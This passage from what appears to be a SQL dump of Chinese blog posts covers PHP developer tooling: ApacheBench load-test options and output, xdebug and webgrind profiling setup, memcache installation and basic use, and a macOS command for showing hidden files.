/&gt;如果一个变量是声明在类中，变量在整个程序的执行过程中都可能需要调用，变量的值是很大的字符串或者数组或者其他内容，中间几乎不会改变该变量的值&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386130010),
(3, 3, '&lt;p&gt; &amp;nbsp; ApacheBench是Apache附带的一个小工具，可以做http服务器的压力测试，可以同时模拟多个并发请求，该工具是安装apache时默认安装的，在apache/bin目录下面。如果要使用该工具，需要已安装apache，apache的安装在此不做说明。&lt;br /&gt; &amp;nbsp; 该工具可以给网站做压力测试，测试网站的请求处理速度，并发请求瓶颈等。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;命令格式：&lt;br /&gt; &amp;nbsp; &amp;nbsp;ab [options][http://]hostname[:port]/path&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;参数介绍：&lt;br /&gt; &amp;nbsp; &amp;nbsp;-n &amp;nbsp; requests &amp;nbsp; &amp;nbsp;Number of requests to perform&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;做一次测试所发送的请求数，默认是1次请求&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-c &amp;nbsp; concurrency &amp;nbsp;Number of multiple requests tomake&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;每次请求的并发数&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-t &amp;nbsp; timelimit &amp;nbsp; Seconds to max. wait for responses&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;测试所进行的最大秒数，,可以将一次测试控制在等待多少秒内，默认没有时间限制&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-p &amp;nbsp; postfile &amp;nbsp; &amp;nbsp;File containing data to POST&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;测试请求包含的post数据&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-T &amp;nbsp; content-type Content-type header for POSTing&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;POST数据需要声明的Content-type头信息&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-vverbosity &amp;nbsp; &amp;nbsp;Howmuch troubleshooting info to print&lt;br /&gt;&lt;span style=&quot;color:#ed1c24&quot;&gt;打印的信息的长度，&lt;/span&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;4或更大值会显示头信息，3或更大值可以显示响应代码(404, 200等), 2或更大值可以显示警告和其他信息。 -V显示版本号并退出&lt;/span&gt;&lt;br /&gt; &amp;nbsp; -w &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Print out results in HTML tables&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;以HTML表格的形式输出测试结果&lt;/span&gt;&lt;br /&gt; &amp;nbsp; -i &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Use HEAD instead of GET&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;用HEAD请求代替GET&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-x &amp;nbsp; attributes &amp;nbsp; String to insert astable attributes&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;table表格的属性&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-y &amp;nbsp; attributes &amp;nbsp; String to insert astr attributes&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;表格中tr的属性&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-z &amp;nbsp; attributes &amp;nbsp; String to insert astd or th attributes&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;表格中td/th的属性&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-C &amp;nbsp; attribute &amp;nbsp; &amp;nbsp;Addcookie, eg. &amp;#39;Apache=1234. (repeatable)&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;对请求附加cookie设置，格式是name=value，该命令可重复设置多个cookie&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-H &amp;nbsp; attribute &amp;nbsp; &amp;nbsp;AddArbitrary header line, eg. &amp;#39;Accept-Encoding: gzip&amp;#39; Inserted afterall normal header lines. (repeatable)&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;设置head的参数，例如接收的压缩格式为gzip&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;-A &amp;nbsp; attribute &amp;nbsp; &amp;nbsp;AddBasic WWW Authentication, the attributes are a colon separatedusername and password.&lt;br /&gt; &amp;nbsp; &amp;nbsp;-P &amp;nbsp; attribute &amp;nbsp; &amp;nbsp;AddBasic Proxy Authentication, the attributes are a colon separatedusername and password.&lt;br /&gt; &amp;nbsp; &amp;nbsp;-X &amp;nbsp; proxy:port &amp;nbsp; Proxyserver and portnumber to use&lt;br /&gt; &amp;nbsp; -V &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Print version number and exit&lt;br /&gt; &amp;nbsp; -k &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Use HTTP KeepAlive feature&lt;br /&gt; &amp;nbsp; -d &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Do not show percentiles served table.&lt;br /&gt; &amp;nbsp; -S &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Do not show confidence estimators and warnings.&lt;br /&gt; &amp;nbsp; -g filename &amp;nbsp; &amp;nbsp;Output collected data to gnuplot format file.&lt;br /&gt; &amp;nbsp; -e filename &amp;nbsp; &amp;nbsp;Output CSV file with percentages served&lt;br /&gt; &amp;nbsp; -h &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Display usage information (this message)&lt;br /&gt; &amp;nbsp; 该工具有很多参数，这里水平有限，有些自己也没用过，不做说明，基本我们常用的命令已经给出了解释。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; 启动该工具的方式，开始-&amp;gt;运行-&amp;gt;cmd，进入dos模式，然后进入到apachein目录。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; 我们以google.com作为测试对象，来具体分析一下返回的结果。&lt;br /&gt; &amp;nbsp; &amp;nbsp;执行命令：ab -n100 -c 10 http://www.google.com/&lt;br /&gt; &amp;nbsp; 此命令为向google.com发送100次请求，并且每次请求附带10个并发请求&lt;br /&gt; &amp;nbsp; &amp;nbsp;返回结果：&lt;br /&gt;ServerSoftware: &amp;nbsp; &amp;nbsp; &amp;nbsp; gws&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;谷歌所用的网站服务器基于apache开发且对谷歌程序优化版&lt;/span&gt;&lt;br /&gt;ServerHostname: &amp;nbsp; &amp;nbsp; &amp;nbsp; www.google.com&lt;br /&gt;ServerPort: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 80&lt;br /&gt;&lt;br /&gt;DocumentPath: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; /&lt;br /&gt;DocumentLength: &amp;nbsp; &amp;nbsp; &amp;nbsp; 376 bytes&lt;br /&gt;&lt;br /&gt;ConcurrencyLevel: &amp;nbsp; &amp;nbsp; 10&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;并发数为10&lt;/span&gt;&lt;br /&gt;Time taken for tests: &amp;nbsp; 5.609seconds&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;整个测试所花费的时间 5.609秒&lt;/span&gt;&lt;br /&gt;Completerequests: &amp;nbsp; &amp;nbsp; 100&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;请求完成数100&lt;/span&gt;&lt;br /&gt;Failedrequests: &amp;nbsp; &amp;nbsp; &amp;nbsp; 0&lt;br /&gt;Writeerrors: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;0&lt;br /&gt;Non-2xxresponses: &amp;nbsp; &amp;nbsp; 100&lt;br /&gt;Totaltransferred: &amp;nbsp; &amp;nbsp; 92755 bytes&lt;br /&gt;HTMLtransferred: &amp;nbsp; &amp;nbsp; &amp;nbsp;37600 bytes&lt;br /&gt;Requests persecond: &amp;nbsp; &amp;nbsp;17.83[#/sec] (mean)&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;每秒处理的请求数&lt;/span&gt;&lt;br /&gt;Time perrequest: &amp;nbsp; &amp;nbsp; &amp;nbsp;560.938 [ms] (mean)&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;每次请求的平均处理时间(毫秒)&lt;/span&gt;&lt;br /&gt;Time perrequest: &amp;nbsp; &amp;nbsp; &amp;nbsp;56.094 [ms] (mean, across all concurrent requests)&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;每次请求中处理每个并发所用的时间&lt;/span&gt;&lt;br /&gt;Transferrate: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 16.15 [Kbytes/sec] received&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;//-----------------------&lt;/span&gt;&lt;br /&gt;Connection Times (ms)&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; min &amp;nbsp;mean[+/-sd]median &amp;nbsp; max&lt;br /&gt;Connect: &amp;nbsp; &amp;nbsp; &amp;nbsp;47 &amp;nbsp;55 &amp;nbsp;7.8 &amp;nbsp; &amp;nbsp;63 &amp;nbsp; &amp;nbsp; 63&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;连接时间 最小为47毫秒 最大为63毫秒平均连接时间约为55毫秒&lt;/span&gt;&lt;br /&gt;Processing: &amp;nbsp; 63 &amp;nbsp;475 88.7 &amp;nbsp; 500 &amp;nbsp; &amp;nbsp;516&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;处理时间 最小为63毫秒 最大为516毫秒平均处理时间约为516毫秒&lt;/span&gt;&lt;br /&gt;Waiting: &amp;nbsp; &amp;nbsp; &amp;nbsp;47 &amp;nbsp;286136.7 &amp;nbsp; 281 &amp;nbsp; &amp;nbsp;516&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;等待时间&lt;/span&gt;&lt;br /&gt;Total: &amp;nbsp; &amp;nbsp; &amp;nbsp; 109 &amp;nbsp;530 88.9 &amp;nbsp; 547 &amp;nbsp; &amp;nbsp;563&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;时间总计&lt;/span&gt;&lt;br /&gt;WARNING: The median and mean for the initial connection time arenot within a no&lt;br /&gt;rmal deviation&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;初始连接时间的平均值不在正常的偏差范围内&lt;/span&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; These results are probably not that reliable.&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;-------------------------//以上为本次测试的分析结果，个人不清楚具体的计算过程&lt;/span&gt;&lt;br /&gt;Percentage of the requests served within a certain time (ms)&lt;br /&gt; 50% &amp;nbsp; &amp;nbsp;547&lt;br /&gt; 66% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 75% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 80% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 90% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 95% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 98% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 99% &amp;nbsp; &amp;nbsp;563&lt;br /&gt; 100% &amp;nbsp; 563 (longest request)&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt; &amp;nbsp; 50%的用户请求处理时间小于547毫秒，66%的的用户请求处理时间小于563毫秒，其他的以此类推，最长的请求处理时间不超过563毫秒&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;由于对于并发请求，cpu实际上并不是同时处理的，而是按照每个请求获得的时间片逐个轮转处理的，所以基本上第一个Timeper request时间约等于第二个Time per request时间乘以并发请求数&lt;/span&gt;&lt;br /&gt;在本例中 560.938&asymp;56.094*10&lt;/p&gt;', 1386130524),
(4, 4, '&lt;p style=&quot;margin-top:10px;&quot;&gt; &amp;nbsp; &amp;nbsp;我们在做项目的时候，经常需要编写大量的PHP代码，有很多的方法以及变量，当项目进行到一定程度，代码越来越多，你会发现程序变慢，但有时我们不知道具体是哪块代码执行慢，或者哪个方法占用了太长的执行时间，这时我们就需要一个调试工具，来帮我们记录程序执行过程中的一些具体信息，包括类、方法名、执行时间、次数等信息，今天介绍的工具是xdebug以及他的结果分析展示工具webgrind。&lt;/p&gt;&lt;br /&gt;&lt;p style=&quot;margin-top:10px;&quot;&gt; &amp;nbsp; &amp;nbsp;xdebug是在PHP安装包中内置的，具体路径是ext/php_xdebug.dll，由于内置，所以我们不需要重新安装，只需要修改配置文件php.ini来启用该库，打开php.ini文件，并查找修改以下配置信息：&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;zend_extension = &amp;quot;c:xamppphpextphp_xdebug.dll&amp;quot;&lt;br /&gt; &amp;nbsp; &amp;nbsp;配置php_xdebug.dll的地址，去掉前面的;号&lt;br /&gt; &amp;nbsp; &amp;nbsp;xdebug.default_enable = On&lt;br /&gt; &amp;nbsp; &amp;nbsp;去掉;号，启用该功能&lt;br /&gt; &amp;nbsp; &amp;nbsp;xdebug.profiler_append = 0&lt;br /&gt; &amp;nbsp; &amp;nbsp;分析结果文件是否重写配置项，0为不重写，新的分析结果会追加到上一次结果分析之后 1为重写，生成新的结果文件，去掉;号&lt;br /&gt; &amp;nbsp; &amp;nbsp;xdebug.profiler_enable = 0&lt;br /&gt; &amp;nbsp; &amp;nbsp;性能分析配置项，如果值为1，该功能自动生成结果分析文件，去掉;号&lt;br /&gt; &amp;nbsp; &amp;nbsp;xdebug.profiler_enable_trigger = 1&lt;br /&gt; &amp;nbsp; &amp;nbsp;需要触发的性能分析配置项，值设为1，需要在访问地址后面加XDEBUG_PROFILE才会生成结果文件&lt;br /&gt; &amp;nbsp; &amp;nbsp;xdebug.profiler_output_dir = &amp;quot;tmp/xdebug&amp;quot;&lt;br /&gt; &amp;nbsp; &amp;nbsp;结果文件生成路径，默认是tmp文件夹，如果修改了配置，xdebug文件夹需要我们手动建立&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;配置信息修改完成，保存php.ini,然后重启apache服务。&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;我们可以访问本地的info.php文件，具体访问方式：&lt;br /&gt; &amp;nbsp; &amp;nbsp;http://localhost/info.php?XDEBUG_PROFILE&lt;br /&gt; &amp;nbsp; &amp;nbsp;然后我们可以看到在tmp/xdebug文件夹下面生成了结果文件，cachegrind.out.**** *为整形数字&lt;br /&gt; &amp;nbsp; &amp;nbsp;我们可以用webgrind去读取该结果，并生成直观的分析结果。&lt;/p&gt;&lt;p style=&quot;margin-top:10px;&quot;&gt; &amp;nbsp; &amp;nbsp;webgrind获取地址: &lt;a href=&quot;https://github.com/jokkedk/webgrind/downloads&quot; target=&quot;_blank&quot;&gt;https://github.com/jokkedk/webgrind/downloads&lt;/a&gt;&lt;/p&gt;&lt;p style=&quot;margin-top:10px;&quot;&gt; &amp;nbsp; &amp;nbsp;下载之后解压，将解压的文件夹复制到你的apache/htdocs里，然后访问，可以看到我们刚才生成的结果文件，点击update可以得到直观的分析结果。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/04/1386172180_xkcn78_658_0_1326420227pAsz.gif.jpg&quot; title=&quot;0_1326420227pAsz.gif.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp;webgrind分析结果参数说明：&lt;br /&gt; &amp;nbsp; &amp;nbsp;分析结果包括了页面执行过程中所访问的方法，函数以及required/include包含的文件。&lt;br /&gt; &amp;nbsp; &amp;nbsp;InvocationCount 方法被执行的次数&lt;br /&gt; &amp;nbsp; &amp;nbsp;Total SelfCost &amp;nbsp;执行该过程/方法的时间，不包括方法内调用执行其他的自定义函数的时间&lt;br /&gt; &amp;nbsp; &amp;nbsp;TotalInclusive Cost 方法执行的总时间，包括方法内调用的其他方法的执行时间&lt;br /&gt; &amp;nbsp; &amp;nbsp;Calls执行过程中调用的方法/函数&lt;br /&gt; &amp;nbsp; &amp;nbsp;Total CallCost 执行所有的调用函数/方法的时间总计&lt;br /&gt; &amp;nbsp; &amp;nbsp;Count方法被调用的次数&lt;br /&gt;&lt;br /&gt; &amp;nbsp; &amp;nbsp;关于不同的颜色的说明：蓝色代表PHP内置函数所占耗费时间的比例，绿色是自定义函数所占耗费时间的比例，灰色是required/include所占耗费时间的比例，黄色是过程执行所占时间的比例&lt;br /&gt; &lt;br /&gt; &amp;nbsp; &amp;nbsp;通过该工具我们可以很直观的看到某个方法，某个过程所花费的时间，可以分析出程序的瓶颈在哪里。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386172390),
(5, 5, '&lt;p&gt;对于PHP程序员来说，mysql是必须学习的数据库，其对PHP所做的各种优化，让我们受益匪浅，用mysql数据库存储、更新数据是非常方便的，但有时我们从某一数据库里获取数据之后，这些数据会在几个页面用到，这时，我们就需要缓存我们已经获取的数据，当我们需要用这些数据时，只需要从缓存里面找到这些数据，这样就减少了数据库的读写操作，减轻了数据库服务器的压力，而且从缓存读数据会比从数据库读数据更快速，MEMCACHE就是这样一个缓存工具。&lt;br /&gt;&lt;/p&gt;&lt;div id=&quot;sina_keyword_ad_area2&quot; class=&quot;articalContent  &quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;span style=&quot;font-size:14px&quot;&gt;Memcache是一个高性能的分布式的内存对象缓存系统，通过在内存里维护一个统一的巨大的hash表，它能够用来存储各种格式的数据，包括&lt;a target=&quot;_blank&quot;&gt;图像&lt;/a&gt;、&lt;a target=&quot;_blank&quot;&gt;视频&lt;/a&gt;、&lt;a target=&quot;_blank&quot;&gt;文件&lt;/a&gt;以及&lt;a target=&quot;_blank&quot;&gt;数据库&lt;/a&gt;检索的结果等。简单的说就是将数据缓存到内存中，然后从内存中读取，从而大大提高读取速度。&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;我们先来看两个概念，可以更清晰的了解memcache&lt;br /&gt;&lt;p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;strong&gt;Memcache是什么？&lt;/strong&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;Memcache是一个自由和开放源代码、高性能、分配的内存对象缓存系统。用于加速动态web应用程序，减轻数据库负载。它可以应对任意多个连接，使用非阻塞的网络IO。由于它的工作机制是在内存中开辟一块空间，然后建立一个HashTable，Memcached自管理这些HashTable。&lt;p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;strong&gt;Memcached又是什么？&lt;/strong&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;Memcached是Memcache系统的主程序文件，以守护程序方式运行于一个或多个服务器中，随时接受客户端的连接操作，使用共享内存存取数据。那PHP中的Memcache是什么？php中的所讲的memcache是用于连接Memecached的php支持扩展之一（可用phpinfo查看），类似mbstring，eAccelerator。&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;strong&gt;简单的说&lt;/strong&gt;&lt;br /&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;Memcache是总的缓存系统项目名称，容易和PHP中的Memcache混淆。我们常提到Memcache其实是PHP中的Memcache，即PHP的Memcached扩展支持。我们常提到Memcached是服务端主程序文件，服务端安装程序。为了让你的程序飞起来，必须安装memcached服务端程序和PHP的Memcached扩展，所以如果您要使用Memcache来缓存系统，memcache和memcached两样我们都需要安装。 &lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;接下来安装MEMCACHE，由于个人用的windows做开发，这里只介绍win下面的MEMCACHE安装以及配置。&lt;br /&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/p&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;安装步骤：&lt;/span&gt;&lt;br style=&quot;color:#1a612c&quot; /&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;1、下载windows版的memcache安装包，并解压到合适的位置，如c:目录下&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;br style=&quot;color:#1a612c&quot; /&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;2、开始运行cmd进入命令行 切换到该解压目录&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;br style=&quot;color:#1a612c&quot; /&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;3、键入命令：memached.exe -d install 安装服务器&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;br style=&quot;color:#1a612c&quot; /&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;4、键入命令：memached.exe -dstart启动服务器，等到下次启动系统的时候，此服务会自动启动。默认的端口号为11211.&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;br style=&quot;color:#1a612c&quot; /&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;5、下载php_memcache.dll放到php目录的ext(扩展包目录)目录内，注意memcache.dll版本要跟php版本保持一致&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;br style=&quot;color:#1a612c&quot; /&gt;&lt;span style=&quot;color:#1a612c&quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;6、打开php.ini并插入以下语句：extension=php_memcache.dll&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/span&gt;&lt;br /&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;至此，memcache服务已经安装完成，然后重启apache服务器，memcache就已经可以正常使用。&lt;br /&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;可以用phpinfo()来查看具体的memcache信息。&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/wbr&gt;&lt;/div&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386172994),
(6, 6, '&lt;p&gt; MEMCACHE是一个强大的缓存工具，利用他我们可以方便的存储需要复用的数据，极大的减轻了数据库服务器的压力，给客户端以更快的响应速度。&lt;br /&gt; &amp;nbsp; 安装好该工具后，我们可以用PHP来执行我们想要的操作，包括存储，读取，更新等等。&lt;br /&gt; &amp;nbsp; PHP内置了一个&lt;span style=&quot;color:#0000bb&quot;&gt;Memcache&lt;/span&gt;&lt;span style=&quot;color:#000000&quot;&gt;类来操作memcache服务器，首先我们看以下代码&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\n  $mem = new Memcache();\r\n  $mem-&amp;gt;connect(&#039;localhost&#039;, 11211);\r\n  $mem-&amp;gt;add(&#039;username&#039;, &#039;jack&#039;, false, 30);\r\n  echo$mem-&amp;gt;get(&#039;username&#039;);\r\n?&amp;gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#007700&quot;&gt;&lt;span style=&quot;color:#000000&quot;&gt;这段代码执行了一个简单的memcache操作，首先连接本地的memcache服务器，默认端口号为11211，然后用add方法向服务器写入了一个key为username的数据，数据内容为jack，数据有效时长30秒，然后我们用get方法读取该数据，最后输出结果为jack&lt;br /&gt; &amp;nbsp; 这是一段简单的应用，包括了存储、读取数据，当然我们可以进行更多的数据操作，具体方法列表请参见PHP手册，这里只做几个常用的方法的介绍。&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::connect&lt;/span&gt; &amp;nbsp;&mdash; 打开一个memcached服务端连接&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::add&lt;/span&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&mdash; 增加一个元素到缓存服务器&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::get&lt;/span&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&mdash; 从缓存服务器获取一个缓存元素&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::replace&lt;/span&gt; &amp;nbsp;&mdash; 替换已经存在的元素的值&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::delete&lt;/span&gt; &amp;nbsp; &mdash; 从缓存服务器删除一个元素&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::flush&lt;/span&gt; &amp;nbsp; &amp;nbsp;&mdash; 清洗（删除）已经存储的所有的元素&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span style=&quot;color:#ff0000&quot;&gt;Memcache::increment&lt;/span&gt;&mdash; 增加一个元素的值&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt; &amp;nbsp; 注意一下increment的用法&lt;br /&gt;&lt;span style=&quot;color:#007700&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;$c_counter= $mem-&amp;gt;increment(&#039;counter&#039;,1);&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#000000&quot;&gt;缓存服务器里counter元素的值加1，&lt;/span&gt;如果指定的&lt;em&gt;&lt;tt&gt;&lt;span style=&quot;font-family:&amp;#39;宋体&amp;#39;,verdana,arial,helvetica,sans-serif&quot;&gt;key&lt;/span&gt;&lt;/tt&gt;&lt;/em&gt;对应的元素不是数值类型并且不能被转换为数值，会将此值修改为后面的value值。&lt;span style=&quot;color:#007700&quot;&gt;&lt;br /&gt;&lt;/span&gt; &amp;nbsp; 关于基本类以及方法的介绍就写这么多，后面会结合具体的问题，来介绍memcache的深入应用。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386206555),
(7, 7, '&lt;p&gt;苹果MACOS系统查看隐藏文件有很多种方式，最简单的可以用terminal命令来查看&lt;br /&gt;打开terminal&lt;br /&gt;&lt;br /&gt;显示MAC隐藏文件&lt;br /&gt;输入命令 sudo defaults write com.apple.finder AppleShowAllFilesTRUE&lt;br /&gt;&lt;/p&gt;&lt;div id=&quot;sina_keyword_ad_area2&quot; class=&quot;articalContent  &quot;&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;killall Finder&lt;br /&gt;&lt;br /&gt;隐藏MAC隐藏文件&lt;br /&gt;输入命令 sudo defaults write com.apple.finder AppleShowAllFilesFALSE&lt;br /&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;&lt;wbr&gt;killall 